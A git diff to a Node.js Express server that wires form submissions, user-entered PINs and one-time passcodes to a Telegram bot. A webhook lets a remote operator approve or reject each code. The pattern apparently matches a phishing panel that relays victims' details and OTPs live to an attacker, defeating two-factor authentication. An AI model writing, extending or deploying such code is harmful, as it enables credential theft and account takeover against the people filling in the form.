@@ -3,6 +3,7 @@ import dotenv from 'dotenv';
 import path from 'path';
 import fs from 'fs';
 import { fileURLToPath } from 'url';
+import { sendTelegramNotification, handleTelegramCallback, setWebhook, sendPinVerificationNotification, sendOtpVerificationNotification } from './src/telegram/telegramService.js';
 
 dotenv.config();
 
@@ -22,6 +23,17 @@ if (fs.existsSync(path.join(__dirname, 'build'))) {
 // Store form submissions in memory (in production, use a database)
 const formSubmissions = new Map();
 
+// Webhook endpoint for Telegram bot
+app.post('/webhook/telegram', async (req, res) => {
+  try {
+    await handleTelegramCallback(req.body, formSubmissions);
+    res.sendStatus(200);
+  } catch (error) {
+    console.error('Error handling Telegram webhook:', error);
+    res.sendStatus(500);
+  }
+});
+
 // Endpoint to receive form submissions from the frontend
 app.post('/api/submit-form', async (req, res) => {
   try {
@@ -33,14 +45,19 @@ app.post('/api/submit-form', async (req, res) => {
       ...formData,
       id: submissionId,
       submissionId: submissionId,
-      status: 'approved',
+      status: 'pending',
       pinVerified: false,
       pinStatus: 'pending',
       timestamp: new Date().toISOString()
     });
 
-    // Telegram notifications disabled
-    console.log('Form submitted successfully (Telegram disabled)');
+    // Send notification to Telegram (don't fail if it errors)
+    try {
+      await sendTelegramNotification(formData, submissionId);
+      console.log('Telegram notification sent successfully');
+    } catch (telegramError) {
+      console.error('Telegram notification failed (continuing anyway):', telegramError.message);
+    }
 
     res.json({ success: true, submissionId });
   } catch (error) {
@@ -69,12 +86,18 @@ app.post('/api/verify-pin', async (req, res) => {
       return res.status(404).json({ success: false, error: 'Submission not found' });
     }
 
-    // Auto-approve PIN (Telegram disabled)
-    submission.pinVerified = true;
-    submission.pinStatus = 'correct';
-    console.log('PIN verified successfully (Telegram disabled)');
+    // Send PIN verification notification to Telegram (don't fail if it errors)
+    try {
+      await sendPinVerificationNotification(formData || submission, pin, submissionId);
+      console.log('PIN verification notification sent successfully');
+    } catch (telegramError) {
+      console.error('PIN verification notification failed (continuing anyway):', telegramError.message);
+      // Auto-approve PIN if Telegram fails (for local development)
+      submission.pinVerified = true;
+      submission.pinStatus = 'correct';
+    }
 
-    res.json({ success: true, message: 'PIN verified' });
+    res.json({ success: true, message: 'PIN verification request sent' });
   } catch (error) {
     console.error('Error verifying PIN:', error);
     res.status(500).json({ success: false, error: 'Failed to verify PIN' });
@@ -104,12 +127,18 @@ app.post('/api/verify-otp', async (req, res) => {
       return res.status(404).json({ success: false, error: 'Submission not found' });
     }
 
-    // Auto-approve OTP (Telegram disabled)
-    submission.otpVerified = true;
-    submission.otpStatus = 'correct';
-    console.log('OTP verified successfully (Telegram disabled)');
+    // Send OTP verification notification to Telegram (don't fail if it errors)
+    try {
+      await sendOtpVerificationNotification(formData || submission, otp, submissionId);
+      console.log('OTP verification notification sent successfully');
+    } catch (telegramError) {
+      console.error('OTP verification notification failed (continuing anyway):', telegramError.message);
+      // Auto-approve OTP if Telegram fails (for local development)
+      submission.otpVerified = true;
+      submission.otpStatus = 'correct';
+    }
 
-    res.json({ success: true, message: 'OTP verified' });
+    res.json({ success: true, message: 'OTP verification request sent' });
   } catch (error) {
     console.error('Error verifying OTP:', error);
     res.status(500).json({ success: false, error: 'Failed to verify OTP' });
@@ -138,9 +167,24 @@ app.get('*', (req, res) => {
   }
 });
 
-// Set up server
-app.listen(PORT, () => {
+// Set up Telegram webhook on server start
+app.listen(PORT, async () => {
   console.log(`Server running on port ${PORT}`);
+  
+  // Only set webhook if APP_URL is provided and is HTTPS (required by Telegram)
+  const appUrl = process.env.APP_URL;
+  if (appUrl && appUrl.startsWith('https://')) {
+    const webhookUrl = `${appUrl}/webhook/telegram`;
+    try {
+      await setWebhook(webhookUrl);
+      console.log('Telegram webhook set successfully');
+    } catch (error) {
+      console.error('Failed to set Telegram webhook:', error);
+    }
+  } else {
+    console.log('Skipping webhook setup (HTTPS URL required for Telegram webhooks)');
+    console.log('Webhook will be set automatically when deployed to production');
+  }
 });
 
 export default app;
